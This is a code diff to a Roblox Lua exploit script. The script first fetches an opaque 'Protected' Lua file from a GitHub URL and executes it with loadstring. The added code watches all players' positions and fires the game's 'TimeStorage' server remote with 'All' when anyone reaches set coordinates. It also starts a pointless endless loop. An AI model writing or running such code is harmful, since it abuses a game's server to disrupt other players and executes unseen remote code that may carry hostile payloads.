@@ -1,6 +1,53 @@
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sigmarizzler11aa/sts/refs/heads/main/Protected_4047913774660354.lua"))()
 
+task.wait(1)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Remote = game:GetService("ReplicatedStorage").Remotes.TimeStorage
+
+local targetPosition1 = Vector3.new(-222, 10, 53)
+local targetPosition2 = Vector3.new(-240, 10, 53)
+local tolerance = 0.1  -- small tolerance for floating-point precision
+
+local function isAtTarget(pos, target)
+    return (pos - target).Magnitude <= tolerance
+end
+
+-- Keep track if the "infinite loop" condition is active
+local infiniteLoopActive = false
+
+RunService.Heartbeat:Connect(function()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Character then
+            for _, part in pairs(player.Character:GetChildren()) do
+                if part:IsA("BasePart") then
+                    local pos = part.Position
+                    
+                    -- Check first target
+                    if isAtTarget(pos, targetPosition1) then
+                        Remote:FireServer("All")
+                    end
+                    
+                    -- Check second target
+                    if isAtTarget(pos, targetPosition2) and not infiniteLoopActive then
+                        infiniteLoopActive = true
+                        -- Simulate a "while true do end" safely
+                        spawn(function()
+                            while true do
+                                task.wait()  -- prevents freezing
+                                -- put any repeating code here if needed
+                            end
+                        end)
+                    end
+                end
+            end
+        end
+    end
+end)
+
+
 task.wait(3)
 
 local HttpService = game:GetService("HttpService")
